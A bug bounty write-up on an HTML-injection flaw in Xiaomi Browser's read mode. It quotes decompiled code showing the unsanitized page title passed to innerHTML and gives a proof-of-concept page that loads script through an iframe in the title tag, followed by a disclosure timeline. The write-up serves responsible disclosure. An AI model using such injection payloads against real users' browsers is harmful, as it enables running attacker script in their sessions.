# Xiaomi Arbitrary JavaScript 

Hey Everyone, I hope you all are fine and doing well.

In this writeup, I’ll tell you how I was able to Execute Arbitrary JavaScript in Xiaomi Browser using HTML Injection.

## About The Issue
Due to lack of HTML Sanitization, It's possible to Inject Malicious Iframe tag in Readmode and Execute Arbitrary JavaScript code.

## Package Name
com.android.browser

## Version Info
V12.10.4~go

I look the Browser `file:///android_asset/readmode/Readability.js` source code.

The HTML and JavaScript are fully sanitized, however after I read the java source code in readmode activity and `reading_mode_html_internal.js` source code.

I found out that I have a chance to use HTML payload without passing through sanitization inside `<title>` tag.

In `com.android.browser.readmode.e.java` snippet code
```java
StringBuilder stringBuilder = new StringBuilder();
stringBuilder.append("var contentHTML='");
stringBuilder.append(str2);
stringBuilder.append("';appendPage();
setContent(contentHTML);");
str2 = stringBuilder.toString();
if (O != null) {
	stringBuilder = new StringBuilder();
	stringBuilder.append(str2);
	stringBuilder.append("var titleHTML='");
	stringBuilder.append(O);
	stringBuilder.append("';setTitle(titleHTML);");
	str2 = stringBuilder.toString();
}
```
In `file:///android_asset/readmode/reading_mode_html_internal.js` snippet code
```javascript
function setTitle(titleHTML){
	var title = document.getElementById("title" + pageNum);
	if (titleHTML.trim().length != 0) {
		title.setAttribute("class", "title");
		title.innerHTML = titleHTML;
	}
}
```
After getting the HTML `<title>` tag to the string, it will not pass through sanitization.
## Step to Reproduce
- Create `malware_frame.html` file with following content:
```html
<html>
	<head>
		<title>Frame embeded with malware</title>
	</head>
	<body>
		<p>iframe element with malicious code</p>
	<script>alert('Uh oh, I am bad, bad malware!!!')</script>
	</body>
</html>
```
- Create `poc.html` file with following content.
```html
<html>
	<head>
		<title><iframe src="http://localhost:8080/malware_frame.html" height="0" width="0" frameborder="0"></title>
		<h1>Use Readmode for better Experience</h1>
	</head>
	<body>
		<p>Lorem ipsum, or lipsum as it is sometimes known, is dummy text used in laying out print, graphic or web designs. The passage is attributed to an unknown typesetter in the 15th century who is thought to have scrambled parts of Cicero's De Finibus Bonorum et Malorum for use in a type specimen book.</p><br>
		<p>Lorem ipsum, or lipsum as it is sometimes known, is dummy text used in laying out print, graphic or web designs. The passage is attributed to an unknown typesetter in the 15th century who is thought to have scrambled parts of Cicero's De Finibus Bonorum et Malorum for use in a type specimen book.</p>
	</body>
</html>
```
- Run local server `localhost:8080`
- In browser, open the following url `http://localhost:8080/poc.html`
- You see JavaScript from `malware_frame.html` executed immediately after Readmode ON

## Impact
An attacker is able to execute malicious JavaScript in context of other user's Browser.

## Vulnerability Disclosure
| Date | Contact |
| ----------- | ----------- |
| April 30, 2020 | I reported it on HackerOne regarding this vulnerability issue. |
| May 8, 2020 | My report has been triaged. |
| May 17, 2020 | Vulnerability has been fixed and I got bounty. |
